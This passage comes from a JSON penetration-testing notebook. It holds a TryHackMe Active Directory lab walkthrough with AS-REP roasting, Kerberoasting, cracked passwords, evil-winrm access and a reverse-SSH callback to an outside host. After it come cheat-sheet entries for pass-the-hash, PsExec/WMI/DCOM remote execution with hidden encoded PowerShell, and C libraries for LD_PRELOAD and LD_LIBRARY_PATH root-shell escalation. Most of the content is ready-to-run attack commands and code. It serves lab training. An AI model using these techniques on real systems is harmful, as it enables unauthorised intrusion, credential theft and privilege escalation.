                "code": "# Output\n  Hostname:        WIN-2BO8M1OE1M1\n  FQDN:            WIN-2BO8M1OE1M1.vulnnet-rst.local\n  NetBIOS Domain:  VULNNET-RST\n  DNS Domain:      vulnnet-rst.local\n  OS: Windows 10 / Server 2019 Build 17763 x64\n  OS version: '2019'\n  Architecture: x64\n  OS build: '17763'\n\n\nACCESSIBLE SHARES (6)\nShare           Access       Type     Comment\n--------------- ------------ -------- -------------------------\nADMIN$          READ         DISK     Remote Admin\nC$              READ         DISK     Default share\nNETLOGON        READ         DISK     Logon server share\nSYSVOL          READ         DISK     Logon server share\nVulnNet-Business-Anonymous READ         DISK     VulnNet Business Sharing\nVulnNet-Enterprise-Anonymous READ         DISK     VulnNet Enterprise Sha...\n\nNO ACCESS (1)\nShare           Type     Comment\n--------------- -------- -------------------------\nIPC$            IPC      Remote IPC"
              }
            ],
            "optional": true,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "smbclient known shares",
        "codes": [
          {
            "lang": "bash",
            "code": "smbclient -N \\\\\\\\10.64.131.199\\\\ADMIN$\nsmbclient -N \\\\\\\\10.64.131.199\\\\C$\nsmbclient -N \\\\\\\\10.64.131.199\\\\IPC$\nsmbclient -N \\\\\\\\10.64.131.199\\\\NETLOGON\nsmbclient -N \\\\\\\\10.64.131.199\\\\SYSVOL\nsmbclient -N \\\\\\\\10.64.131.199\\\\VulnNet-Business-Anonymous\nsmbclient -N \\\\\\\\10.64.131.199\\\\VulnNet-Enterprise-Anonymous"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Downloads all files and subdirectories from current location.",
        "substeps": [
          {
            "title": "VulnNet-Enterprise-Anonymous (Share Documents)",
            "codes": [
              {
                "lang": "bash",
                "code": "smbclient -N \\\\\\\\10.64.131.199\\\\VulnNet-Enterprise-Anonymous"
              },
              {
                "lang": "bash",
                "code": "VULNNET OPERATIONS\n~~~~~~~~~~~~~~~~~~~~\n\nWe bring predictability and consistency to your process. Making it repetitive doesn\u2019t make it boring. \nSet the direction, define roles, and rely on automation to keep reps focused and make onboarding a breeze.\nDon't wait for an opportunity to knock - build the door. Contact us right now.\nVulnNet Entertainment is fully commited to growth, security and improvement.\nMake a right decision!\n\n~VulnNet Entertainment\n~TryHackMe\nVULNNET SAFETY\n~~~~~~~~~~~~~~~~\n\nTony Skid is a core security manager and takes care of internal infrastructure.\nWe keep your data safe and private. When it comes to protecting your private information...\nwe\u2019ve got it locked down tighter than Alcatraz. \nWe partner with TryHackMe, use 128-bit SSL encryption, and create daily backups. \nAnd we never, EVER disclose any data to third-parties without your permission. \nRest easy, nothing\u2019s getting out of here alive.\n\n~VulnNet Entertainment\n~TryHackMe\nVULNNET SYNC\n~~~~~~~~~~~~~~\n\nJohnny Leet keeps the whole infrastructure up to date and helps you sync all of your apps.\nProposals are just one part of your agency sales process. We tie together your other software, so you can import contacts from your CRM,\nauto create deals and generate invoices in your accounting software. We are regularly adding new integrations.\nSay no more to desync problems.\nTo contact our sync manager call this number: 7331 0000 1337\n\n~VulnNet Entertainment\n~TryHackMe"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "VulnNet-Business-Anonymous (Share Documents)",
            "codes": [
              {
                "lang": "bash",
                "code": "smbclient -N \\\\\\\\10.64.131.199\\\\VulnNet-Business-Anonymous"
              },
              {
                "lang": "bash",
                "code": "VULNNET BUSINESS\n~~~~~~~~~~~~~~~~~~~\n\nAlexa Whitehat is our core business manager. All business-related offers, campaigns, and advertisements should be directed to her. \nWe understand that when you\u2019ve got questions, especially when you\u2019re on a tight proposal deadline, you NEED answers. \nOur customer happiness specialists are at the ready, armed with friendly, helpful, timely support by email or online messaging.\nWe\u2019re here to help, regardless of which you plan you\u2019re on or if you\u2019re just taking us for a test drive.\nOur company looks forward to all of the business proposals, we will do our best to evaluate all of your offers properly. \nTo contact our core business manager call this number: 1337 0000 7331\n\n~VulnNet Entertainment\n~TryHackMe\nVULNNET BUSINESS\n~~~~~~~~~~~~~~~~~~~\n\nJack Goldenhand is the person you should reach to for any business unrelated proposals.\nManaging proposals is a breeze with VulnNet. We save all your case studies, fees, images and team bios all in one central library.\nTag them, search them and drop them into your layout. Proposals just got... dare we say... fun?\nNo more emailing big PDFs, printing and shipping proposals or faxing back signatures (ugh).\nYour client gets a branded, interactive proposal they can sign off electronically. No need for extra software or logins.\nOh, and we tell you as soon as your client opens it.\n\n~VulnNet Entertainment\n~TryHackMe\nVULNNET TRACKING\n~~~~~~~~~~~~~~~~~~\n\nKeep a pulse on your sales pipeline of your agency. We let you know your close rate,\nwhich sections of your proposals get viewed and for how long,\nand all kinds of insight into what goes into your most successful proposals so you can sell smarter.\nWe keep track of all necessary activities and reach back to you with newly gathered data to discuss the outcome. \nYou won't miss anything ever again. \n\n~VulnNet Entertainment\n~TryHackMe"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "codes": [
          {
            "lang": "bash",
            "code": "mask \"\"\n\nrecurse ON\n\nprompt OFF\n\nmget *"
          }
        ]
      },
      {
        "title": "Active Directory Username Generator",
        "substeps": [
          {
            "title": "nxc_enum",
            "codes": [
              {
                "lang": "bash",
                "code": "cd /opt/nxc_enum && python -m nxc_enum 10.64.131.199 -U /root/machines/VulnNetRoasted/10.64.131.199/generated_usernames -A --copy-paste -o /root/machines/VulnNetRoasted/10.64.131.199/nxc/users_nxc_enum_results.txt"
              },
              {
                "lang": "bash",
                "code": "# Output\n ===========================================\n|    AS-REP Roasting for 10.64.131.199    |\n ===========================================\n[*] Requesting AS-REP tickets for 44 user(s)...\n[!] Found 1 AS-REP hash(es)!\n\n$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:3ee183de99a7553e0f5b1a34a2d3b60a$7ffcfed6f4a1e4974f722ee44a44d7c76d40e9d340a8144237722269c8b6a83eed60bfba9bf9ab5f2847d3926d15619fcb10d24dd863d26da913eb4398ab39b46bc405fa143eee97e667212adaaa596d98a402e6a98576bb6f569a8ec04583996dea521a2a5ddef7bdc9f92c7f23ab384d74e5ef266e57f507efb897c25cbb62835ea43c41beae1ac85af1245aee10f904b0fe9f61f3394d18fa20df9ce463d1b170e08dbc6ea7c19ab3f5b5c4a9e505c1c536f636df3c3f89e1294c60b7017a562f0a3533d56cc598b9076ac2dcb09b170b91e44541cf1beac19ff4198eefc8ea61f6a198734232b992094c315fd5a5e2622d408047"
              }
            ],
            "optional": true,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Hashcat",
            "codes": [
              {
                "lang": "bash",
                "code": "hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt"
              },
              {
                "lang": "bash",
                "code": "# Output\ntj072889*"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "codes": [
          {
            "lang": "bash",
            "code": "python3 username-generate.py -u /root/machines/VulnNetRoasted/10.64.131.199/usernames -o /root/machines/VulnNetRoasted/10.64.131.199/generated_usernames"
          }
        ]
      },
      {
        "title": "nxc_enum with t-skid creds",
        "codes": [
          {
            "lang": "bash",
            "code": "cd /opt/nxc_enum && python -m nxc_enum 10.64.131.199 -C /root/machines/VulnNetRoasted/10.64.131.199/confirmedCreds -A --copy-paste -o /root/machines/VulnNetRoasted/10.64.131.199/nxc/admin_nxc_enum_results.txt"
          },
          {
            "lang": "bash",
            "code": "# Output\n  \u2192 Kerberoastable accounts: enterprise-core-vn\n    Request TGS tickets for offline cracking with hashcat\n    $ nxc ldap 10.64.131.199 -u 't-skid' -p 'tj072889*' -d 'vulnnet-rst.local' --kerberoasting hashes.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Kerberoast",
        "substeps": [
          {
            "title": "Crack",
            "codes": [
              {
                "lang": "bash",
                "code": "hashcat -m 13100 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule"
              },
              {
                "lang": "bash",
                "code": "# Output\n$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$4da5aed881d51b0c6a66de837803959f$e895b29b5ffab3217b3c7ea6ec356eeb8ff131e9c78f9b65558de8baf1ae161a25aae89222b14d147bff2aa35f0f92c769227fc214ed752674dc3fbc58d69b3157cf449b3d0cfb8b027e351ef638e0dcafb908459a5d185120994239424ce366e17cbb80a18d5a15ef5d64f9eb29bbec60159f7dba82e004a36774b551a5882b1cb3891bba23670e426429051e1f3918b94bb317d404be061d15aef2f2294b1419dea1bc4fe21937fde634a282f09cb4f0d5f0632987fdeab03fead9c81c6d9b50e417c721c0d885bf9130bf8517e087f78e2e6b2d364effe4aa88ea2e09a6edf7ee8c7cdfa9248ff06e5a7c4090d1f806a3bb4026762d750b7668c475efc022b023ec1a0c3679923b8825b4493ba45d8a9d2fe45bb94a1b01649055b52428c6d5ff5368bc82c110b9363486bb573e2effa2e8331ef09218169a11cc8aef3d9c3c98b6b2218b9efa0e0bdb85858e437a4e2573e60f086dd6105de2d6fab8c895f71835437787c4834125a52ebced98e0716bd48639ebdc75094d18c410509c9479bf98d0c69979847267fab57f393040e5df3945abd9addd8df24072c6eb76c1211669becda4df2dd83e3d5d81b9388bf5f8cee163097338276ccd2eb6420422641d3ee88bf5abe5db9056efe5cf1973fd7e3fbaf3486fd1376476597d31dedee1dd957a10a057eb60ba249f44543e44b6933d519302df5b07eb7f73c03b35763c1992b74581606dced817df02873622f3b824231b372ec24fa23c82b1f8ef4eb951108b83bda6a2238592658da8f149c6548fd4efca41cf285d2a4b432668417cf5820fd3d0ee69066b0001291d0c1b8a7c6d031099001cca4dc29c35d2b4e9f40e1dd5af996d2f3b0a04bcfdcad2f84d11465125c8e6cc6ab0d0adbe7df5bd934c6d1aee52e24068a897cac5a3da92d45ce56bbdbee725746b09c27c262cf4ebe84f214729cc2877332d8078c1b93d9cafc6feac79d8e64d72c18b37e07bc1da8843be14e8b70097c820c4c281001dbe0476397c7c17025dd6150bdfbc7f80d0141e579cb63326af2c29f649df3f9e7c2e2ea8a9ced36381ce5fe709ac29fbc8714c91e91178f9ffc49f7c106cee3e90fd0c5eac0c55ee3905da0e142101fc563868610c6228111f688ead831fce909972fb8e340a3a64cfbde6ea8dc6a334fa652c283664b643e1f5b30da80f404b272815a1b3a57820e3fde2a84e29a76745826d42ae3c41d77433c6cc49bf0cb4012e3531f25869c6e2fa7e73df665a82a3222ed2c66d339a6b58b92923ffa3607520feea991dce44562edb84670dec44d4664e2f0144e0d4ec2020e21676ba66932ad467d718e66f1db7fc86f53d6ea0876ad3a399dc866fed3b4ebfea02cb356803d07797efc4169c76d6fb13:ry=ibfkfv,s6h,"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "authfinder",
            "codes": [
              {
                "lang": "bash",
                "code": "cd /opt/authfinder && python3 authfinder.py 10.64.175.157 -f /root/machines/VulnNetRoasted/10.64.131.199/confirmedCreds"
              },
              {
                "lang": "text",
                "code": "Target           Username         Password             Service      Result\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n10.64.175.157    enterprise-core  ry=ibfkfv,s6h,       winrm        Auth\n10.64.175.157    enterprise-core  ry=ibfkfv,s6h,       smbexec      Auth\n10.64.175.157    enterprise-core  ry=ibfkfv,s6h,       wmi          Auth\n10.64.175.157    enterprise-core  ry=ibfkfv,s6h,       psexec       Auth\n10.64.175.157    enterprise-core  ry=ibfkfv,s6h,       atexec       Auth\n10.64.175.157    enterprise-core  ry=ibfkfv,s6h,       ldap         Auth"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-GetUserSPNs -request -dc-ip 10.64.175.157 vulnnet-rst.local/t-skid:'tj072889*' -outputfile kerberoast.txt"
          },
          {
            "lang": "bash",
            "code": "$krb5tgs$23$*enterprise-core-vn$VULNNET-RST.LOCAL$vulnnet-rst.local/enterprise-core-vn*$4da5aed881d51b0c6a66de837803959f$e895b29b5ffab3217b3c7ea6ec356eeb8ff131e9c78f9b65558de8baf1ae161a25aae89222b14d147bff2aa35f0f92c769227fc214ed752674dc3fbc58d69b3157cf449b3d0cfb8b027e351ef638e0dcafb908459a5d185120994239424ce366e17cbb80a18d5a15ef5d64f9eb29bbec60159f7dba82e004a36774b551a5882b1cb3891bba23670e426429051e1f3918b94bb317d404be061d15aef2f2294b1419dea1bc4fe21937fde634a282f09cb4f0d5f0632987fdeab03fead9c81c6d9b50e417c721c0d885bf9130bf8517e087f78e2e6b2d364effe4aa88ea2e09a6edf7ee8c7cdfa9248ff06e5a7c4090d1f806a3bb4026762d750b7668c475efc022b023ec1a0c3679923b8825b4493ba45d8a9d2fe45bb94a1b01649055b52428c6d5ff5368bc82c110b9363486bb573e2effa2e8331ef09218169a11cc8aef3d9c3c98b6b2218b9efa0e0bdb85858e437a4e2573e60f086dd6105de2d6fab8c895f71835437787c4834125a52ebced98e0716bd48639ebdc75094d18c410509c9479bf98d0c69979847267fab57f393040e5df3945abd9addd8df24072c6eb76c1211669becda4df2dd83e3d5d81b9388bf5f8cee163097338276ccd2eb6420422641d3ee88bf5abe5db9056efe5cf1973fd7e3fbaf3486fd1376476597d31dedee1dd957a10a057eb60ba249f44543e44b6933d519302df5b07eb7f73c03b35763c1992b74581606dced817df02873622f3b824231b372ec24fa23c82b1f8ef4eb951108b83bda6a2238592658da8f149c6548fd4efca41cf285d2a4b432668417cf5820fd3d0ee69066b0001291d0c1b8a7c6d031099001cca4dc29c35d2b4e9f40e1dd5af996d2f3b0a04bcfdcad2f84d11465125c8e6cc6ab0d0adbe7df5bd934c6d1aee52e24068a897cac5a3da92d45ce56bbdbee725746b09c27c262cf4ebe84f214729cc2877332d8078c1b93d9cafc6feac79d8e64d72c18b37e07bc1da8843be14e8b70097c820c4c281001dbe0476397c7c17025dd6150bdfbc7f80d0141e579cb63326af2c29f649df3f9e7c2e2ea8a9ced36381ce5fe709ac29fbc8714c91e91178f9ffc49f7c106cee3e90fd0c5eac0c55ee3905da0e142101fc563868610c6228111f688ead831fce909972fb8e340a3a64cfbde6ea8dc6a334fa652c283664b643e1f5b30da80f404b272815a1b3a57820e3fde2a84e29a76745826d42ae3c41d77433c6cc49bf0cb4012e3531f25869c6e2fa7e73df665a82a3222ed2c66d339a6b58b92923ffa3607520feea991dce44562edb84670dec44d4664e2f0144e0d4ec2020e21676ba66932ad467d718e66f1db7fc86f53d6ea0876ad3a399dc866fed3b4ebfea02cb356803d07797efc4169c76d6fb13"
          }
        ]
      },
      {
        "title": "Evil-winrm",
        "codes": [
          {
            "lang": "bash",
            "code": "evil-winrm -i 10.64.175.157 -u 'enterprise-core-vn' -p 'ry=ibfkfv,s6h,'"
          },
          {
            "lang": "bash",
            "code": "*Evil-WinRM* PS C:\\Users\\enterprise-core-vn\\Desktop> type user.txt\nTHM{726b7c0baaac1455d05c827b5561f4ed}"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "RSSH",
        "codes": [
          {
            "lang": "bash",
            "code": "\u276f ./build.sh reverse 192.168.148.119:443\n\n[*] Build Configuration:\n[*]   Mode:     reverse\n[*]   Target:   reverse@192.168.148.119:443\n[*]   BindPort: random (allocated by SSH server)"
          },
          {
            "lang": "bash",
            "code": "[*] Reverse-SSH Handler\n[*] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n[*] Listening on port:  443\n[*] Expecting callback: 192.168.148.119\n[*] Username:           reverse\n[*] Password:           134bd652b73ffc6d\n\n[!] When you see 'New connection from', run:\n\n    ssh -p <PORT> reverse@127.0.0.1\n\n[!] Random port mode: Look for 'reachable via 127.0.0.1:<PORT>'\n[!] in the connection message below to find the actual port.\n\n[*] \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n2026/02/04 20:35:50 Starting ssh server on :443\n2026/02/04 20:35:50 Success: listening on [::]:443\n2026/02/04 20:37:00 Attempt to bind at 127.0.0.1:0 granted\n2026/02/04 20:37:00 New connection from 10.64.175.157:50206: VULNNET-RST\\enterprise-core-vn on WIN-2BO8M1OE1M1 reachable via 127.0.0.1:33865"
          },
          {
            "lang": "bash",
            "code": "ssh -MS /tmp/target r@127.0.0.1 -p 38609"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "My connection to this lab has died over 5 times now...",
            "variant": "danger"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "RustScan",
        "url": "https://github.com/RustScan/RustScan"
      },
      {
        "text": "feroxbuster",
        "url": "https://github.com/epi052/feroxbuster"
      },
      {
        "text": "nikto",
        "url": "https://github.com/sullo/nikto"
      },
      {
        "text": "ffuf",
        "url": "https://github.com/ffuf/ffuf"
      },
      {
        "text": "nmap",
        "url": "https://github.com/nmap/nmap"
      },
      {
        "text": "SecLists",
        "url": "https://github.com/danielmiessler/SecLists"
      },
      {
        "text": "authfinder",
        "url": "https://github.com/Real-Fruit-Snacks/authfinder"
      },
      {
        "text": "nxc_enum",
        "url": "https://github.com/Real-Fruit-Snacks/nxc_enum"
      }
    ],
    "lab": true,
    "notes": [
      {
        "type": "note",
        "content": "Machine Info\n- **Platform**: TryHackMe\n- **Difficulty**: Easy\n- **OS**:  Windows\n- **IP Address**: 10.64.131.199\n- **Domain**: [optional - for AD environments]\n- **Date Started**: 2026-02-03\n- **Date Completed**:\n- **User Flag**:\n- **Root Flag**:\n- **Target Hostname**: [optional]\n- **Target FQDN**: [optional]",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Lateral Movement",
    "title": "Lateral Movement",
    "tags": [
      "Lateral_Movement",
      "Windows"
    ],
    "steps": [
      {
        "title": "NetExec - Command Execution",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' -x \"whoami\""
          },
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -p '<Password>' -X \"Get-Process\""
          },
          {
            "lang": "bash",
            "code": "nxc winrm <TargetIP> -u <Username> -p '<Password>' -X \"Get-Process\""
          },
          {
            "lang": "bash",
            "code": "nxc smb <TargetIP> -u <Username> -H '<NTLMHash>' -x \"whoami\""
          },
          {
            "lang": "bash",
            "code": "nxc smb 192.168.1.0/24 -u Administrator -H '<NTLMHash>' -x \"whoami\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true,
        "notes": [
          {
            "type": "note",
            "content": "Validate creds and execute commands in one step. **Pwn3d!** = admin access.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "AuthFinder - Auto-Method Selection",
        "codes": [
          {
            "lang": "bash",
            "code": "authfinder <TargetIP> <Username> '<Password>' \"whoami\""
          },
          {
            "lang": "bash",
            "code": "authfinder <TargetIP> <Username> :<NTLMHash> \"whoami\""
          },
          {
            "lang": "bash",
            "code": "authfinder 192.168.1.1-50 <Username> '<Password>' \"hostname\" -o"
          },
          {
            "lang": "bash",
            "code": "authfinder 192.168.1.0/24 <Username> '<Password>' \"whoami\" --threads 20"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Automatically tries WinRM, PSExec, SMBExec, WMI, AtExec until one succeeds.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Impacket - Pass-the-Hash",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-psexec -hashes :<NTLMHash> Administrator@<TargetIP>"
          },
          {
            "lang": "bash",
            "code": "impacket-wmiexec -hashes :<NTLMHash> Administrator@<TargetIP>"
          },
          {
            "lang": "bash",
            "code": "impacket-smbexec -hashes :<NTLMHash> Administrator@<TargetIP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Impacket - With Password",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-psexec <Domain>/<Username>:'<Password>'@<TargetIP>"
          },
          {
            "lang": "bash",
            "code": "impacket-wmiexec <Domain>/<Username>:'<Password>'@<TargetIP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Impacket - Task Scheduler",
        "codes": [
          {
            "lang": "bash",
            "code": "impacket-atexec -hashes :<NTLMHash> <Domain>/<Username>@<TargetIP> \"whoami\""
          },
          {
            "lang": "bash",
            "code": "impacket-atexec <Domain>/<Username>:'<Password>'@<TargetIP> \"whoami\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true,
        "notes": [
          {
            "type": "note",
            "content": "Single command execution via Task Scheduler.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "PsExec - Windows Native",
        "codes": [
          {
            "lang": "powershell",
            "code": ".\\PsExec.exe \\\\<TargetHost> -u <Domain>\\<Username> -p '<Password>' cmd.exe"
          },
          {
            "lang": "powershell",
            "code": ".\\PsExec.exe \\\\<TargetHost> -u <Domain>\\<Username> -p '<Password>' -s cmd.exe"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "WMI Execution",
        "codes": [
          {
            "lang": "powershell",
            "code": "wmic /node:<TargetHost> /user:<Domain>\\<Username> /password:'<Password>' process call create \"cmd.exe /c whoami > C:\\temp\\whoami.txt\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "WinRM - PowerShell Remoting",
        "codes": [
          {
            "lang": "powershell",
            "code": "$cred = Get-Credential\nEnter-PSSession -ComputerName <TargetHost> -Credential $cred"
          },
          {
            "lang": "powershell",
            "code": "Invoke-Command -ComputerName <TargetHost> -Credential $cred -ScriptBlock { whoami }"
          },
          {
            "lang": "powershell",
            "code": "Invoke-Command -ComputerName Server1,Server2,Server3 -Credential $cred -ScriptBlock { whoami }"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Evil-WinRM",
        "codes": [
          {
            "lang": "bash",
            "code": "evil-winrm -i <TargetIP> -u <Username> -p '<Password>'"
          },
          {
            "lang": "bash",
            "code": "evil-winrm -i <TargetIP> -u <Username> -H '<NTLMHash>'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "RDP - Pass-the-Hash",
        "codes": [
          {
            "lang": "bash",
            "code": "xfreerdp3 /u:<Username> /pth:<NTLMHash> /v:<TargetIP> /dynamic-resolution +clipboard"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true,
        "notes": [
          {
            "type": "note",
            "content": "Requires Restricted Admin mode enabled on target.",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "Enable Restricted Admin Mode",
        "codes": [
          {
            "lang": "bash",
            "code": "reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "HackTricks Lateral Movement",
        "url": "https://book.hacktricks.xyz/windows-hardening/lateral-movement"
      },
      {
        "text": "AuthFinder GitHub",
        "url": "https://github.com/Real-Fruit-Snacks/authFinder"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Move to other hosts using harvested credentials or hashes.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Active Directory and Kerberos Attacks",
    "title": "Lateral Movement",
    "tags": [
      "Active_Directory",
      "Kerberos",
      "Windows"
    ],
    "steps": [
      {
        "title": "DCOM Lateral Movement",
        "codes": [
          {
            "lang": "powershell",
            "code": "$TargetIP = \"<TargetIP>\"\n$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\", $TargetIP))\n\nif ($dcom) {\n    Write-Host \"[+] DCOM object created successfully!\"\n    $dcom.Document.ActiveView.ExecuteShellCommand(\"cmd\", $null, \"/c <Command>\", \"7\")\n}"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Use DCOM objects for remote code execution. Requires admin privileges and DCOM access."
          }
        ]
      },
      {
        "title": "Execute Encoded PowerShell via DCOM",
        "codes": [
          {
            "lang": "powershell",
            "code": "$EncodedPayload = \"<Base64EncodedCommand>\"\n$dcom.Document.ActiveView.ExecuteShellCommand(\"powershell\", $null, \"powershell -nop -w hidden -e $EncodedPayload\", \"7\")"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Shared Library Attacks",
    "title": "LD_LIBRARY_PATH Hijacking",
    "tags": [
      "Exploitation",
      "Linux",
      "Post_Exploitation",
      "include"
    ],
    "steps": [
      {
        "title": "When Exploitable",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Exploitable conditions:\n- Binary is SUID/SGID\n- Process runs with elevated privileges\n- **LD_LIBRARY_PATH** is used in sudo command",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Check Sudo LD_LIBRARY_PATH",
        "codes": [
          {
            "lang": "bash",
            "code": "sudo -l\n# Look for env_keep+=LD_LIBRARY_PATH"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Create Malicious Library",
        "codes": [
          {
            "lang": "c",
            "code": "#include <stdio.h>\n#include <stdlib.h>\n\nstatic void hijack() __attribute__((constructor));\n\nvoid hijack() {\n    unsetenv(\"LD_LIBRARY_PATH\");\n    setuid(0);\n    setgid(0);\n    system(\"/bin/bash -p\");\n}"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Compile Malicious Library",
        "codes": [
          {
            "lang": "bash",
            "code": "gcc -shared -fPIC -o libhijack.so hijack.c"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Exploit with LD_LIBRARY_PATH",
        "codes": [
          {
            "lang": "bash",
            "code": "sudo LD_LIBRARY_PATH=/tmp /path/to/vulnerable/binary"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Shared Library Attacks",
    "title": "LD_PRELOAD Exploitation",
    "tags": [
      "Exploitation",
      "Linux",
      "Post_Exploitation",
      "include"
    ],
    "steps": [
      {
        "title": "When Exploitable",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Highly privileged attack when:\n- sudo allows **env_keep+=LD_PRELOAD**\n- Can run any command with sudo",
            "variant": "danger"
          }
        ]
      },
      {
        "title": "Check for LD_PRELOAD in Sudo",
        "codes": [
          {
            "lang": "bash",
            "code": "sudo -l\n# Look for env_keep+=LD_PRELOAD"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Create LD_PRELOAD Payload",
        "codes": [
          {
            "lang": "c",
            "code": "#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\n\nvoid _init() {\n    unsetenv(\"LD_PRELOAD\");\n    setuid(0);\n    setgid(0);\n    system(\"/bin/bash -p\");\n}"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Compile LD_PRELOAD Library",
        "codes": [
          {
            "lang": "bash",
            "code": "gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Exploit with LD_PRELOAD",
        "codes": [
          {
            "lang": "bash",
            "code": "sudo LD_PRELOAD=/tmp/preload.so /usr/bin/any_allowed_command"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "LDAP Enumeration",
    "title": "LDAP Basics",
    "tags": [
      "Active_Directory",
      "Enumeration",
      "LDAP"
    ],
